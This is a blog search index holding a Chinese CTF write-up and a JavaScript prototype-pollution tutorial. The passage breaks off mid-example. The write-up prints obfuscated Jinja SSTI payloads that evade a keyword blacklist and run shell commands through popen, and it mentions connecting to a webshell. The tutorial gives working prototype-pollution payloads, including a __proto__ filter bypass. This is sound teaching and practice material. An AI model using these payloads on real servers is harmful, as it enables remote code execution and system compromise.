<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ciscn-ccb部分WP</title>
      <link href="/2024/12/15/ciscn-ccb%E9%83%A8%E5%88%86WP/"/>
      <url>/2024/12/15/ciscn-ccb%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<h1 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h1><p>开局源码，貌似不能直接搞</p><p>拉到本地直接梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>+html.escape(f.read())+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    template_code = request.form.get(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="comment"># 安全过滤</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span></span><br><span class="line">    result = render_template_string(template_code)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151847862.png"></p><p>拿payload直接打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;%set gl=&#x27;_&#x27;*2+&#x27;globals&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set bu=&#x27;_&#x27;*2+&#x27;builtins&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set im=&#x27;_&#x27;*2+&#x27;i&#x27;&#x27;mport&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set rr=&#x27;so&#x27;[::-1]%&#125;&#123;&#123;cycler.next[gl][bu][im](rr)[&#x27;p&#x27;&#x27;open&#x27;](&#x27;echo `ls /` &gt; app.py&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151848872.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;%set gl=&#x27;_&#x27;*2+&#x27;globals&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set bu=&#x27;_&#x27;*2+&#x27;builtins&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set im=&#x27;_&#x27;*2+&#x27;i&#x27;&#x27;mport&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set rr=&#x27;so&#x27;[::-1]%&#125;&#123;&#123;cycler.next[gl][bu][im](rr)[&#x27;p&#x27;&#x27;open&#x27;](&#x27;echo `cat /flag` &gt; app.py&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151849782.png"></p><h1 id="hello-web"><a href="#hello-web" class="headerlink" title="hello web"></a>hello web</h1><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151903324.png"></p><p>看注释看到了一个这个提示</p><p>访问后发现，得….&#x2F;&#x2F;绕过</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151911177.png"></p><p>这么个事儿</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151911700.png" alt="image-20241215191139648"></p><p>它是个🐎啊</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412152028604.png" alt="image-20241215202829273"></p><p>蚁剑连接在&#x2F;run&#x2F;log&#x2F;这个里面的其中一个文件夹中有flag</p><p><del>sxweb1明明按道理应该出的，™的一直报500…….5555555…还是菜。。。</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> -web -ciscn&amp;ccb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS原型链污染</title>
      <link href="/2024/12/13/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/12/13/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="JS原型链污染"><a href="#JS原型链污染" class="headerlink" title="JS原型链污染"></a>JS原型链污染</h1><p>nodejs和javascript语法和标准有些不同，应用场景不一样，但是在原型链污染这方面可以互通。</p><h3 id="JS创建对象的三种方法"><a href="#JS创建对象的三种方法" class="headerlink" title="JS创建对象的三种方法"></a>JS创建对象的三种方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">js创建对象的三种方法 ：</span><br><span class="line"></span><br><span class="line">普通创建</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person=&#123;<span class="attr">name</span>:<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;19&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person=&#123;&#125;  <span class="comment">//创建空对象</span></span><br><span class="line"></span><br><span class="line">构造函数方法创建</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">person</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span>=<span class="string">&quot;liahuqiu&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">test</span>=<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">person.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">a</span>=<span class="number">3</span>;</span><br><span class="line">web=<span class="keyword">new</span> <span class="title function_">person</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(web.<span class="title function_">test</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(web.<span class="property">a</span>)</span><br><span class="line"></span><br><span class="line">通过object创建</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">a.<span class="property">c</span>=<span class="number">3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">c</span>)</span><br></pre></td></tr></table></figure><h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><h4 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h4><p>javascript里的每一个对象（object），都有一些内置属性（property），原型本身也是一个对象，所以他也有自己的原型，这就形成了一个原型链，当一个原型的原型是null，原型链就会在这里结束。</p><p>这个”原型“属性是一个指向对象原型的一个对象，这个属性没有统一的称呼，但是浏览器都支持使用 ”__proto__“来查看原型。访问一个对象原型的标准方法是使用 ”Object.getPrototypeOf()“。</p><h5 id="Prototype-原型-原型对象"><a href="#Prototype-原型-原型对象" class="headerlink" title="Prototype 原型 | 原型对象"></a>Prototype 原型 | 原型对象</h5><p>1、Prototype它是【函数的】一个属性</p><p>2、Protopype是个对象</p><p>3、当我们创建函数的时候会默认添加Prototype这个属性</p><h5 id="proto-隐式原型"><a href="#proto-隐式原型" class="headerlink" title="__proto__ 隐式原型"></a>__proto__ 隐式原型</h5><p>1、【对象】的属性</p><p>2、指向构造函数的Protopype</p><p>3、obj.<em>_proto</em>_ &#x3D;&#x3D;&#x3D; test.prototype   等于true</p><h5 id="原型链顶层"><a href="#原型链顶层" class="headerlink" title="原型链顶层"></a>原型链顶层</h5><p>Object.prototype.__proto__     等于null</p><h5 id="原型链查找"><a href="#原型链查找" class="headerlink" title="原型链查找"></a>原型链查找</h5><p>instanceof运算符可以用来判断某个构造函数的prototype属性是否存在另外一个要检测对象的原型链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function My()&#123;&#125;</span><br><span class="line">function You()&#123;&#125;</span><br><span class="line"></span><br><span class="line">var myOne=new My();</span><br><span class="line">console.info(myOne instanceof My)  //true</span><br><span class="line">console.info(myOne instanceof You)  //false</span><br></pre></td></tr></table></figure><p><strong>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</strong></p><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span> (name) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">name</span>=name</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span>=<span class="number">1</span></span><br><span class="line">&#125; <span class="comment">//这只是一个普通函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = <span class="keyword">new</span> <span class="title function_">test</span>(<span class="string">&#x27;xiaoming&#x27;</span>)  <span class="comment">//使用new生成obj对象了，test此时就是构造函数，任何函数都可以是构造函数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">a</span>) <span class="comment">//返回 1</span></span><br><span class="line">test.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">b</span>=<span class="number">2</span>  <span class="comment">//给函数原型添加b属性，值为2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">b</span>) <span class="comment">//返回2</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">c</span>=<span class="number">3</span>  <span class="comment">//给顶层添加c属性，值为3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">c</span>) <span class="comment">//返回3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span> === test.<span class="property"><span class="keyword">prototype</span></span>)  <span class="comment">//对象的__proto__等于函数的原型</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(test.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property">prototypre</span>) <span class="comment">//函数原型对象的__proto__属性就等于Object函数的原型  返回ture</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>) <span class="comment">//Object函数的原型对象的__proto__属性等于NULL，因为Object是顶层</span></span><br></pre></td></tr></table></figure><h5 id="结构剖析"><a href="#结构剖析" class="headerlink" title="结构剖析"></a>结构剖析</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj &#123;</span><br><span class="line">    <span class="attr">a</span>:<span class="number">1</span>,                                  <span class="comment">//a属性，值为1</span></span><br><span class="line"><span class="attr">__proto__</span>:test.<span class="property"><span class="keyword">prototype</span></span> =&#123;           <span class="comment">//obj.__proto__指向test.prototype</span></span><br><span class="line">        <span class="attr">b</span>:<span class="number">2</span>,                              <span class="comment">//函数原型添加的b属性，值为2</span></span><br><span class="line"><span class="attr">__proto__</span>:<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;  <span class="comment">//test.prototype.__proto__指向Object.prototypre</span></span><br><span class="line">            <span class="attr">c</span>:<span class="number">3</span>,                          <span class="comment">//顶层添加的c属性，值为3</span></span><br><span class="line"><span class="attr">__proto__</span>:<span class="literal">null</span>              <span class="comment">//Object.prototype.__proto__指向null   </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="链子剖析"><a href="#链子剖析" class="headerlink" title="链子剖析"></a>链子剖析</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj -&gt; __proto__ -&gt; test.prototype -&gt; __proto__ -&gt; Object.prototype -&gt; __proto__ -&gt; null</span><br></pre></td></tr></table></figure><p>这就是obj的原型链</p><h4 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h4><p>因为原型链就是套娃的，一级接着一级，属性是从上面往下叠加的，下面的都会继承上面的属性，如果我们在原型链的上级添加了恶意对象，那么原型链就会被污染，后续创建的对象都可以继承并调用恶意对象。</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412132318079.png"></p><p>如果服务端使用某些可以复制、继承变量的函数，函数的参数是用户可控，那么就有可能造成原型链污染攻击。</p><p>此时b的上级原型a的属性已经被污染，b继承a后，也可以调用恶意对象。</p><h4 id="原型链污染利用"><a href="#原型链污染利用" class="headerlink" title="原型链污染利用"></a>原型链污染利用</h4><p>在javascript中，function是一个用于定义函数的关键字，Function是代表所有函数的内置原型对象。</p><h5 id="constructor概念"><a href="#constructor概念" class="headerlink" title="constructor概念"></a>constructor概念</h5><p>Object.prototype.constructor其中constructor是一个对象的数据属性，创建对象后，访问constructor属性，可以返回构造该对象的来源【就是告诉你它是从哪来的】（不是该对象的原型链上级，两者不同）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">demo：</span><br><span class="line">var a=1;</span><br><span class="line">a.__proto__</span><br><span class="line">//Number &#123;0, toExponential: ƒ, toFixed: ƒ, toPrecision: ƒ, toString: ƒ, …&#125;</span><br><span class="line">a.__proto__.constructor</span><br><span class="line">//Number() &#123; [native code] &#125;</span><br><span class="line">a.constructor</span><br><span class="line">//Number() &#123; [native code] &#125;</span><br><span class="line">a.constructor === Number</span><br><span class="line">//true</span><br><span class="line">var b=Number(1);</span><br><span class="line">b.constructor === a.constructor</span><br><span class="line">//true</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="constructor-和-prototype-的角色"><a href="#constructor-和-prototype-的角色" class="headerlink" title="constructor 和 prototype 的角色"></a><strong><code>constructor</code> 和 <code>prototype</code> 的角色</strong></h5><h5 id="constructor-的作用"><a href="#constructor-的作用" class="headerlink" title="constructor 的作用"></a><strong><code>constructor</code> 的作用</strong></h5><ul><li><p>每个 JavaScript 对象都有一个 <code>constructor</code> 属性，默认情况下，它指向创建该对象的构造函数。</p></li><li><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">constructor</span> === <span class="title class_">Object</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="prototype-的作用"><a href="#prototype-的作用" class="headerlink" title="prototype 的作用"></a><strong><code>prototype</code> 的作用</strong></h5><ul><li><p>构造函数的 <code>prototype</code> 属性是实例对象的默认原型（即实例的 <code>__proto__</code>）。</p></li><li><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">MyClass</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> obj = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span> === <span class="title class_">MyClass</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="两者的关系"><a href="#两者的关系" class="headerlink" title="两者的关系"></a><strong>两者的关系</strong></h5><ul><li>修改构造函数的 <code>prototype</code> 会影响由该构造函数创建的所有对象的原型。</li><li>通过 <code>constructor.prototype</code> 可以间接修改对象的原型链，甚至是全局对象的原型。</li></ul><p>所以，当我们的__proto__被过滤了，我们可以直接用constructor.prototype绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key == &quot;__proto__&quot;) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        if (key in target &amp;&amp; key in source) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let payload = JSON.parse(&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;polluted&quot;: &quot;Yes, I am polluted!&quot;&#125;&#125;&#125;&#x27;);</span><br><span class="line"></span><br><span class="line">let user=&#123;&#125;</span><br><span class="line">merge(user, payload);</span><br><span class="line"></span><br><span class="line">// 验证</span><br><span class="line">console.log(&#123;&#125;.polluted); // &quot;Yes, I am polluted!&quot;</span><br></pre></td></tr></table></figure><h5 id="Function概念"><a href="#Function概念" class="headerlink" title="Function概念"></a>Function概念</h5><p>每一个javascript的function实际上都是Function对象，Function是javascript内置的对象，Function用以实现很多基本的功能，如Number、toString等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(function () &#123;&#125;).constructor</span><br><span class="line">//Function() &#123; [native code] &#125;</span><br><span class="line">(function () &#123;&#125;).constructor === Function</span><br><span class="line">//true</span><br></pre></td></tr></table></figure><h6 id="Function-constructor"><a href="#Function-constructor" class="headerlink" title="Function() constructor"></a>Function() constructor</h6><p>Function()构造器可以创建一个Function对象，可以直接调用Function()构造器动态的创建函数。但是会存在像eval()的安全隐患和一些性能问题。</p><p>eval()和Function区别:</p><p>1、eval()可以访问本地的变量、全局变量</p><p>2、Funtion()创建函数时只能执行全局变量</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412132318206.png" alt="image-20241116203304251"></p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412132318959.png" alt="image-20241116204011412"></p><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse"></a>JSON.parse</h3><p>看一个经典的递归合并函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target,source</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line"><span class="title function_">merge</span>(target[key],source[key])</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">target[key]=source[key]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1=&#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2=&#123;<span class="attr">a</span>: <span class="number">1</span>,<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="title function_">merge</span>(o1,o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3=&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br><span class="line">[<span class="title class_">Running</span>] node <span class="string">&quot;payload.js&quot;</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">[<span class="title class_">Done</span>] exited <span class="keyword">with</span> code=<span class="number">0</span> <span class="keyword">in</span> <span class="number">0.199</span> seconds</span><br></pre></td></tr></table></figure><p>核心思想是理解 <code>__proto__</code> 在对象定义中的行为，以及它在合并操作中如何影响目标对象。以下是逐步解释：</p><h4 id="1-proto-的行为"><a href="#1-proto-的行为" class="headerlink" title="1. __proto__ 的行为"></a>1. <strong><code>__proto__</code> 的行为</strong></h4><p>在 JavaScript 中，<code>__proto__</code> 是一个特殊属性，用于设置对象的原型。它不是普通的键，而是与对象的原型链相关。</p><h5 id="当-proto-被用作键："><a href="#当-proto-被用作键：" class="headerlink" title="当 __proto__ 被用作键："></a>当 <code>__proto__</code> 被用作键：</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;;</span><br></pre></td></tr></table></figure><ul><li>在这种情况下，<code>__proto__</code> 表面上看是一个普通的键值对。</li><li><strong>实际行为</strong>：<code>__proto__</code> 这个键会被特殊处理，将 <code>&#123;b: 2&#125;</code> 作为 <code>o2</code> 的原型，而不是普通的对象属性。</li></ul><p>相当于：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">o2.<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line">o2.<span class="property">__proto__</span> = &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;; <span class="comment">// o2 继承了 &#123;b: 2&#125; 作为它的原型。</span></span><br></pre></td></tr></table></figure><p>结果：</p><ul><li><code>o2.a</code> 是 o2 自己的属性。</li><li><code>o2.b</code> 不直接存在于 o2，而是来自于它的原型 <code>&#123;b: 2&#125;</code>。</li></ul><p>如果直接访问 <code>o2.b</code>，JavaScript 会通过原型链查找，因此 <code>o2.b</code> 的值是 <code>2</code>。</p><h4 id="2-合并函数的行为"><a href="#2-合并函数的行为" class="headerlink" title="2. 合并函数的行为"></a>2. <strong>合并函数的行为</strong></h4><p>我们来看 <code>merge</code> 函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong><code>for...in</code> 循环</strong>：<br>遍历 <code>source</code> 的所有可枚举属性，包括继承的属性（从原型链上来的）。</li><li><strong><code>key in source</code> 判断</strong>： 确保 <code>key</code> 是 <code>source</code> 中的一个属性（包括自身和原型链）。</li></ul><h4 id="3-为什么只有-a-被合并？"><a href="#3-为什么只有-a-被合并？" class="headerlink" title="3. 为什么只有 a 被合并？"></a>3. <strong>为什么只有 <code>a</code> 被合并？</strong></h4><p>当你执行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: 